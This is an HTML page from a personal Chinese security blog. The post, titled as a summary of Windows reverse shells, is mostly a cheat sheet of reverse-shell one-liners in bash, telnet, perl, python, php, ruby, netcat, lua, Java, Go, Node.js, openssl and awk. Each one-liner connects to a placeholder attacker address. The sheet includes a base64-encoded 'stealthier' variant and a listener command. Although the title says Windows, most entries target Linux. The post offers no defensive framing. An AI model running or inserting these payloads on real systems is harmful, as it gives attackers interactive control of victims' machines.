@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <!-- Required meta tags always come first -->
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="google-site-verification" content="GgupatpoZgdqsBlxEZoMqGAy3aXAFtXIrYged3SB6EA" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>Windows反弹Shell总结 | nJcx's Blog
+</title>
+  <link rel="canonical" href="https://www.njcx.bid/posts/P12.html">
+
+
+  <link rel="apple-touch-icon" href="https://www.njcx.bid/apple-touch-icon.png" sizes="180x180">
+  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="https://www.njcx.bid/manifest.json">
+  <meta name="theme-color" content="#333333">
+
+  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/pygments/emacs.min.css">
+  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/style.css">
+
+
+<meta name="description" content="Windows反弹shell总结">
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a34c7a96ae9745547c373575407c521f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<body>
+  <header class="header">
+    <div class="container">
+      <div class="row">
+        <div class="col-sm-4">
+          <a href="https://www.njcx.bid">
+            <img class="img-fluid" src=https://www.njcx.bid/images/profile.png width=200 height=200 alt="nJcx's Blog">
+          </a>
+        </div>
+        <div class="col-sm-8">
+          <h1 class="title">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.njcx.bid">nJcx's Blog</a></h1>
+          <p class="text-muted">十年生死两茫茫，写程序，到天亮。相顾无言，惟有泪千行</p>
+          <ul class="list-inline">
+                    <li class="list-inline-item">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.zhihu.com/people/njcxs" target="_blank">知乎</a></li>
+                <li class="list-inline-item"><a href="https://www.facebook.com/nJcx1" target="_blank">FaceBook</a></li>
+                <li class="list-inline-item"><a href="https://github.com/njcx" target="_blank">Github</a></li>
+            <li class=" list-inline-item text-muted">|</li>
+            <li class="list-inline-item"><a class="fa fa-github" href="https://github.com/njcx" target="_blank"></a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main">
+    <div class="container">
+      <h1>Windows反弹Shell总结
+</h1>
+      <hr>
+<article class="article">
+  <header>
+    <ul class="list-inline">
+      <li class="list-inline-item text-muted" title="2017-05-27T16:20:00+03:00">
+        <i class="fa fa-clock-o"></i>
+        Sat 27 May 2017
+      </li>
+      <li class="list-inline-item">
+        <i class="fa fa-folder-open-o"></i>
+        <a href="https://www.njcx.bid/category/an-quan.html">安全</a>
+      </li>
+      <li class="list-inline-item">
+        <i class="fa fa-user-o"></i>
+        <a href="https://www.njcx.bid/author/njcx.html">nJcx</a>      </li>
+      <li class="list-inline-item">
+        <i class="fa fa-files-o"></i>
+        <a href="https://www.njcx.bid/tag/fan-dan-shell.html">#反弹shell</a>      </li>
+    </ul>
+  </header>
+  <div class="content">
+    <h4>汇总</h4>
+<div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+sh -i &gt;<span class="p">&amp;</span> /dev/udp/127.0.0.1/4242 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#UDP</span>
+
+<span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
+
+<span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
+
+nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'</span>
+
+<span class="c1">#Stealthier method</span>
+<span class="c1">#B64 encode the shell like: echo "nohup bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.4.185/4444 0&gt;&amp;1'" | base64 -w0</span>
+<span class="nb">echo</span> bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK <span class="p">|</span> base64 -d <span class="p">|</span> bash <span class="m">2</span>&gt;/dev/null
+</pre></div>
+<div class="highlight"><pre><span></span>telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
+rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
+telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/bash <span class="p">|</span> telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt;
+rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="m">1</span>&gt;/tmp/bkpipe
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+
+<span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">#Linux</span>
+<span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">12345</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
+
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<span class="c1">#IPv6</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span> 
+</pre></div>
+<div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="x">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/1234")'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
+<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
+</pre></div>
+<div class="highlight"><pre><span></span>nc -e /bin/sh <span class="m">10</span>.0.0.1 <span class="m">1234</span>
+
+nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
+nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;<span class="p">|</span> /bin/bash <span class="p">|</span> nc &lt;ATTACKER-IP&gt; &lt;PORT2&gt;
+rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; <span class="m">1</span>&gt;/tmp/bkpipe
+</pre></div>
+<p>如果nc不支持-e，</p>
+<div class="highlight"><pre><span></span>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc <span class="m">10</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
+</pre></div>
+<div class="highlight"><pre><span></span>nc <span class="m">10</span>.0.0.1 <span class="m">6666</span><span class="p">|</span>/bin/bash<span class="p">|</span><span class="m">10</span>.0.0.1 <span class="m">1234</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="o">#</span><span class="n">Linux</span>
+<span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
+<span class="o">#</span><span class="n">Windows</span> <span class="o">&amp;</span> <span class="n">Linux</span>
+<span class="n">lua5</span><span class="mf">.1</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, '</span><span class="n">r</span><span class="s1">') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span>
+</pre></div>
+<p>Java</p>
+<div class="highlight"><pre><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
+</pre></div>
+<p>Golang</p>
+<div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s1">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">go</span> <span class="nt">run</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">rm</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span>
+</pre></div>
+<p>Nodejs</p>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
+        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">),</span>
+        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="p">[]);</span>
+    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">8080</span><span class="p">,</span> <span class="s2">"10.17.26.64"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
+<span class="p">})();</span>
+
+
+<span class="nx">or</span>
+
+<span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc -e /bin/sh [IPADDR] [PORT]'</span><span class="p">)</span>
+
+<span class="nx">or</span>
+
+<span class="o">-</span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span>
+<span class="o">-</span><span class="nx">x</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc [IPADDR] [PORT] -e /bin/bash'</span><span class="p">)</span>
+</pre></div>
+<p>用openssl 反弹shell</p>
+<p>攻击者</p>
+<div class="highlight"><pre><span></span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes <span class="c1">#Generate certificate</span>
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; <span class="c1">#Here you will be able to introduce the commands</span>
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span class="c1">#Here yo will be able to get the response</span>
+</pre></div>
+<p>靶机</p>
+<div class="highlight"><pre><span></span><span class="c1">#Linux</span>
+openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+
+<span class="c1">#Windows</span>
+openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span class="p">|</span>cmd.exe<span class="p">|</span>openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+</pre></div>
+<div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
+</pre></div>
+<p>在带有公网的机器上开启监听</p>
+<div class="highlight"><pre><span></span>nc -nvlp <span class="m">1234</span>
+</pre></div>
+  </div>
+</article>
+<div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
+<!--PC和WAP自适应版-->
+<div id="SOHUCS" ></div> 
+<script type="text/javascript"> 
+(function(){ 
+var appid = 'cysYUIjwy'; 
+var conf = 'prod_71b5e53cad0d27b5ed44fa5219b069b5'; 
+var width = window.innerWidth || document.documentElement.clientWidth; 
+if (width < 960) { 
+window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+
+<script type="text/javascript" charset="utf-8" src="https://changyan.itc.cn/js/lib/jquery.js"></script>
+<script type="text/javascript" charset="utf-8" src="https://changyan.sohu.com/js/changyan.labs.https.js?appid=cysYUIjwy"></script>    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="row">
+       <ul class="col-sm-6 list-inline">
+          <li class="list-inline-item"><a href="https://www.njcx.bid/authors.html">Authors</a></li>
+          <li class="list-inline-item"><a href="https://www.njcx.bid/archives.html">Archives</a></li>
+          <li class="list-inline-item"><a href="https://www.njcx.bid/categories.html">Categories</a></li>
+          <li class="list-inline-item"><a href="https://www.njcx.bid/tags.html">Tags</a></li>
+        </ul>
+        <p class="col-sm-6 text-sm-right text-muted">
+          本站由 <a href="https://github.com/getpelican/pelican" target="_blank">Pelican 生成</a> 后续 by <a href="https://github.com/njcx" target="_blank">nJcx</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+</body>
+
+</html>
